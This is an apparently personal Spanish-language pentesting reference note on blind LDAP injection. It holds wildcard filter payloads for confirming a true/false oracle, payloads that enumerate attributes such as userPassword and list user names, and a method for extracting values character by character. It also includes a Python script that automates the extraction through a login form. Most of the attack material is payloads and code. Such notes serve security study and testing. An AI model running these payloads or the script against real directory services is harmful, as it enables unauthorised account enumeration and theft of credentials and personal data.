---
tipo: meta
aliases:
  - LDAP blind extraction
  - comodín LDAP
  - enumeración LDAP ciega
tags:
  - meta/referencia
  - dominio/web
---

# LDAP extracción ciega - matriz de referencia

> [!info] Referencia pura, no un zettel
> Cómo sacar atributos carácter por carácter con el comodín cuando no se reflejan. La sintaxis y los payloads de bypass están en [[LDAP filtro - matriz de referencia]]; el criterio, en [[LDAP - extracción ciega]].

Estructura paralela a [[NoSQL extracción ciega - matriz de referencia]] y [[SQLi ciego - matriz de referencia]]: lo único que cambia entre las inyecciones hermanas es la sintaxis del oráculo. Acá el oráculo es el comodín `*`.

## 1. El oráculo

| Canal | Verdadero | Falso |
|---|---|---|
| Booleano por respuesta | login exitoso / resultado presente / `200` | falla / vacío / `403` |

LDAP **no tiene canal temporal fácil** —no hay un `sleep` como en NoSQL con JavaScript—, así que la extracción ciega depende de que exista un oráculo booleano. Sin él, el dominio se corta.

## 2. Confirmar el oráculo

```
(&(uid=admin)(mail=*))     → verdadero si admin tiene mail
(&(uid=admin)(mail=zzz*))  → casi siempre falso
```

Si el primero da el estado "verdadero" y el segundo "falso", hay oráculo sobre `mail`.

## 3. Enumerar atributos

Antes de extraer, saber qué atributos tiene el objeto:

```
(&(uid=admin)(mail=*))
(&(uid=admin)(memberOf=*))
(&(uid=admin)(userPassword=*))
(&(uid=admin)(description=*))
(&(uid=admin)(sAMAccountName=*))
```

Cada uno verdadero/falso dice si el atributo existe. La lista de atributos comunes de AD está en [[AD enumeración - matriz de referencia]].

## 4. Enumerar usuarios

```
(&(uid=a*)(objectClass=*))   → ¿hay uid que empiece con 'a'?
(&(uid=ad*)(objectClass=*))  → afinar
```

Reconstruye la lista de usuarios sin conocerla, bisecando el alfabeto.

## 5. Extraer un atributo carácter por carácter

Medir el largo primero es difícil en LDAP (no hay función de longitud directa), así que se va extendiendo el patrón hasta que deja de coincidir:

```
(&(uid=admin)(mail=a*))     → ¿empieza con 'a'?
(&(uid=admin)(mail=b*))     → ¿con 'b'?
...fijado el primero (ej. 'j'):
(&(uid=admin)(mail=ja*))    → ¿segundo es 'a'?
(&(uid=admin)(mail=jb*))
```

Fin del valor: cuando `valor*` es verdadero pero `valorX*` es falso para todo `X`, se llegó al final —o se prueba `(mail=valor)` sin comodín para confirmar coincidencia exacta.

## 6. Bisecar el alfabeto — el único acelerador

Sin canal temporal ni búsqueda binaria numérica fácil, lo que acorta es probar rangos con el comodín donde el atributo lo permita, o agrupar:

```
(&(uid=admin)(mail>=m))    → ¿el siguiente carácter es >= 'm'? (orden lexicográfico)
(&(uid=admin)(mail<=m))
```

`>=` y `<=` sobre atributos ordenables permiten una bisección parcial, más rápida que probar 26 letras.

## 7. Automatizar

Script propio, el esqueleto:

```python
import requests, string
extraido = ""
while True:
    for c in string.ascii_lowercase + string.digits + "@.-_":
        payload = f"admin)(mail={extraido}{c}*"   # ajustar el cierre al filtro real
        r = requests.post(URL, data={"user": payload, "pass": "x"})
        if es_verdadero(r):     # login, código, o contenido presente
            extraido += c
            break
    else:
        break
print(extraido)
```

El cierre del payload (`admin)(mail=...`) depende de la forma del filtro original — ver [[LDAP filtro - matriz de referencia]] § 4.

## 8. Tabla de errores

| Lo que ves | Qué pasa |
|---|---|
| El comodín no filtra | La entrada se escapa. Ver [[LDAP filtro - matriz de referencia]] § 1 |
| Todos los patrones dan verdadero | El oráculo está invertido o el atributo no existe. Confirmar con § 2 |
| No hay ningún estado observable | LDAP no tiene canal temporal. Sin oráculo, no hay extracción |
| La extracción es lentísima | Sin canal temporal es inevitable; bisecar con `>=`/`<=`, § 6 |
| Se traba a mitad del valor | Carácter fuera del alfabeto probado. Ampliarlo |
| El límite de tasa corta | Cientos de consultas por atributo; medir si vale la pena |

## Relacionadas

[[MOC - LDAP injection]] · [[LDAP filtro - matriz de referencia]] · [[LDAP - extracción ciega]] · [[NoSQL extracción ciega - matriz de referencia]]
